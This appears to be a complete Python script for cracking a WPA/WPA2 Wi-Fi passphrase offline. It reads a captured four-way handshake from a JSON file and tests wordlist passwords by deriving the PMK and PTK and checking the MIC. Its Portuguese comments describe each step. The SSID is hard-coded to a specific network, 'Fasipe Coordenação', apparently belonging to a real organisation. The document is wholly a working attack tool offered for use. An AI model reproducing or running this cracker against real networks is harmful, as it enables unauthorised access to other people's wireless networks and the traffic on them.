import hashlib
import hmac
import json

# Função para calcular a PTK usando PBKDF2 e o PRF512
def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b""
    while i <= ((blen * 8 + 159) // 160):
        hmacsha1 = hmac.new(key, A + b"\x00" + B + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:blen]

# Função para verificar o MIC
def check_mic(pmk, eapol_data, mic_to_test):
    A = b"Pairwise key expansion"
    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)
    ptk = customPRF512(pmk, A, B)
    mic_key = ptk[:16]
    mic = hmac.new(mic_key, eapol_data, hashlib.sha1).digest()[:16]
    return mic == mic_to_test

# Carregar o handshake do JSON
with open("handshake_data.json", "r") as f:
    handshake_info = json.load(f)

# Informações do JSON
SSID = "Fasipe Coordenação".encode("utf-8")  # O SSID da rede, pode ser passado ou lido diretamente do JSON
APmac = bytes.fromhex(handshake_info["APmac"].replace(":", ""))
Clientmac = bytes.fromhex(handshake_info["Clientmac"].replace(":", ""))
ANonce = bytes.fromhex(handshake_info["ANonce"])
SNonce = bytes.fromhex(handshake_info["SNonce"])
MIC = bytes.fromhex(handshake_info["MIC"])
EAPOL = bytes.fromhex(handshake_info["EAPOL"])

# Função de quebra de senha
def crack_password(wordlist_path):
    with open(wordlist_path, "r", encoding="utf-8") as f:
        for password in f:
            password = password.strip()
            print(f"Tentando senha: {password}")
            
            # Gerar PMK (Password Master Key) com o SSID e a passphrase
            pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), SSID, 4096, 32)

            # Verificar MIC
            if check_mic(pmk, EAPOL, MIC):
                print(f"[💜] Senha encontrada: {password}")
                return password
    print("[x] Nenhuma senha da wordlist funcionou.")

# Chamar a função com a wordlist (por exemplo, 'rockyou.txt')
crack_password("words.txt")
